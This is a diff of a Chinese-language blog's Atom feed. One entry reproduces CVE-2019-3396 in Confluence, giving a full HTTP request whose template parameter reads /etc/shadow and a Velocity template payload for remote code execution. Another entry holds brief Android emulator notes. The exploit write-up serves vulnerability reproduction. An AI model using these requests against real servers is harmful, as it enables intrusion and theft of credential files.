@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-04-08T11:38:37.719Z</updated>
+  <updated>2019-04-08T11:43:56.451Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://yoursite.com/2019/04/08/CVE-2019-3396%EF%BC%9Aconfluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ERCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     <id>http://yoursite.com/2019/04/08/CVE-2019-3396：confluence任意文件读取与RCE漏洞复现/</id>
     <published>2019-04-08T11:20:18.000Z</published>
-    <updated>2019-04-08T11:38:37.719Z</updated>
+    <updated>2019-04-08T11:43:56.451Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="CVE-2019-3396的相关情报"><a href="#CVE-2019-3396的相关情报" class="headerlink" title="CVE-2019-3396的相关情报"></a>CVE-2019-3396的相关情报</h1><p>详细的漏洞解析参考<a href="https://chybeta.github.io/2019/04/06/Analysis-for-%E3%80%90CVE-2019-3396%E3%80%91-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/" title="cve-2019-3396" target="_blank" rel="noopener">cve-2019-3396</a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>构造请求<br>    POST /rest/tinymce/1/macro/preview HTTP/1.1<br>    Host: confluence.xxxxxx.com<br>    Pragma: no-cache<br>    Cache-Control: no-cache<br>    Accept: text/html, <em>/</em>; q=0.01<br>    X-Requested-With: XMLHttpRequest<br>    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36<br>    Referer: <a href="http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515" target="_blank" rel="noopener">http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515</a><br>    Accept-Encoding: gzip, deflate<br>    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7<br>    Cookie: xxxxxxx<br>    Content-Type: application/json;charset=utf-8<br>    X-Requested-With: XMLHttpRequest<br>    Connection: close<br>    Content-Length: 176</p><pre><code>{&quot;contentId&quot;:&quot;655594&quot;,&quot;macro&quot;:{&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:{&quot;url&quot;:&quot;https://dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;_template&quot;:&quot;file:///etc/shadow”}}}</code></pre><p>通过template参数中使用file协议可以读取服务器上的任意文件</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>由于confluence使用的是velocity模版引擎，而这个任意文件读取本身是通过渲染模版文件来读取的，因此如果模板文件里调用java对象是会被渲染执行的，具体参考下面：</p><pre><code>#set($e=&quot;e&quot;)$e.getClass().forName(&apos;java.lang.System&apos;).getMethod(&apos;getProperty&apos;, $e.getClass().forName(&apos;java.lang.String&apos;)).invoke(null, &apos;os.name&apos;).toString()</code></pre><p>随意上传或者远端存储一个该内容的vm文件，然后通过上述的文件包含漏洞去包含这个模板文件即可导致RCE</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="CVE-2019-3396的相关情报"><a href="#CVE-2019-3396的相关情报" class="headerlink" title="CVE-2019-3396的相关情报"></a>CVE-2019-3396的相关情报</h1><p>详细的漏洞解析参考<a href>cve-2019-3396</a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>构造请求<br>    POST /rest/tinymce/1/macro/preview HTTP/1.1<br>    Host: confluence.xxxxxx.com<br>    Pragma: no-cache<br>    Cache-Control: no-cache<br>    Accept: text/html, <em>/</em>; q=0.01<br>    X-Requested-With: XMLHttpRequest<br>    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36<br>    Referer: <a href="http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515" target="_blank" rel="noopener">http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515</a><br>    Accept-Encoding: gzip, deflate<br>    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7<br>    Cookie: xxxxxxx<br>    Content-Type: application/json;charset=utf-8<br>    X-Requested-With: XMLHttpRequest<br>    Connection: close<br>    Content-Length: 176</p><pre><code>{&quot;contentId&quot;:&quot;655594&quot;,&quot;macro&quot;:{&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:{&quot;url&quot;:&quot;https://dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;_template&quot;:&quot;file:///etc/shadow”}}}</code></pre><p>通过template参数中使用file协议可以读取服务器上的任意文件</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>由于confluence使用的是velocity模版引擎，而这个任意文件读取本身是通过渲染模版文件来读取的，因此如果模板文件里调用java对象是会被渲染执行的，具体参考下面：</p><pre><code>#set($e=&quot;e&quot;)$e.getClass().forName(&apos;java.lang.System&apos;).getMethod(&apos;getProperty&apos;, $e.getClass().forName(&apos;java.lang.String&apos;)).invoke(null, &apos;os.name&apos;).toString()</code></pre><p>随意上传或者远端存储一个该内容的vm文件，然后通过上述的文件包含漏洞去包含这个模板文件即可导致RCE</p>]]></content>
     
     <summary type="html">
     
@@ -44,31 +44,29 @@
   </entry>
   
   <entry>
-    <title></title>
+    <title>安卓模拟器相关</title>
     <link href="http://yoursite.com/2019/04/08/%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%9B%B8%E5%85%B3/"/>
     <id>http://yoursite.com/2019/04/08/安卓模拟器相关/</id>
-    <published>2019-04-08T09:43:21.475Z</published>
-    <updated>2019-04-08T09:47:55.915Z</updated>
+    <published>2019-04-08T09:43:21.000Z</published>
+    <updated>2019-04-08T11:43:46.227Z</updated>
     
-    <content type="html"><![CDATA[<hr><p>title: 安卓模拟器相关<br>date: 2019-04-08 17:43:21<br>tags:</p><ul><li>Android</li><li>黑灰产薅羊毛</li></ul><p>categories: </p><ul><li>移动安全攻防</li></ul><hr><p>#安卓模拟器杂七杂八的记录</p><h2 id="adb常规操作"><a href="#adb常规操作" class="headerlink" title="adb常规操作"></a>adb常规操作</h2><p>可以参考mumu模拟器官方的文档，蛮详细的<a href="http://mumu.163.com/help/func/20190129/30131_797867.html" title="adb常规操作" target="_blank" rel="noopener">adb常规操作</a></p><h2 id="mumu模拟器"><a href="#mumu模拟器" class="headerlink" title="mumu模拟器"></a>mumu模拟器</h2><h2 id="夜神模拟器"><a href="#夜神模拟器" class="headerlink" title="夜神模拟器"></a>夜神模拟器</h2>]]></content>
+    <content type="html"><![CDATA[<h2 id="安卓模拟器杂七杂八的记录"><a href="#安卓模拟器杂七杂八的记录" class="headerlink" title="安卓模拟器杂七杂八的记录"></a>安卓模拟器杂七杂八的记录</h2><h2 id="adb常规操作"><a href="#adb常规操作" class="headerlink" title="adb常规操作"></a>adb常规操作</h2><p>可以参考mumu模拟器官方的文档，蛮详细的<a href>adb常规操作</a></p><h2 id="mumu模拟器"><a href="#mumu模拟器" class="headerlink" title="mumu模拟器"></a>mumu模拟器</h2><h2 id="夜神模拟器"><a href="#夜神模拟器" class="headerlink" title="夜神模拟器"></a>夜神模拟器</h2>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;hr&gt;
-&lt;p&gt;title: 安卓模拟器相关&lt;br&gt;date: 2019-04-08 17:43:21&lt;br&gt;tags:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Android&lt;/li&gt;
-&lt;li&gt;黑灰产薅羊毛&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;categories: &lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;移动
+        &lt;h2 id=&quot;安卓模拟器杂七杂八的记录&quot;&gt;&lt;a href=&quot;#安卓模拟器杂七杂八的记录&quot; class=&quot;headerlink&quot; title=&quot;安卓模拟器杂七杂八的记录&quot;&gt;&lt;/a&gt;安卓模拟器杂七杂八的记录&lt;/h2&gt;&lt;h2 id=&quot;adb常规操作&quot;&gt;&lt;a href=&quot;#adb常规操
       
     
     </summary>
     
+      <category term=" 移动安全攻防" scheme="http://yoursite.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"/>
+    
+    
+      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
+    
+      <category term="黑灰产薅羊毛" scheme="http://yoursite.com/tags/%E9%BB%91%E7%81%B0%E4%BA%A7%E8%96%85%E7%BE%8A%E6%AF%9B/"/>
     
   </entry>
   
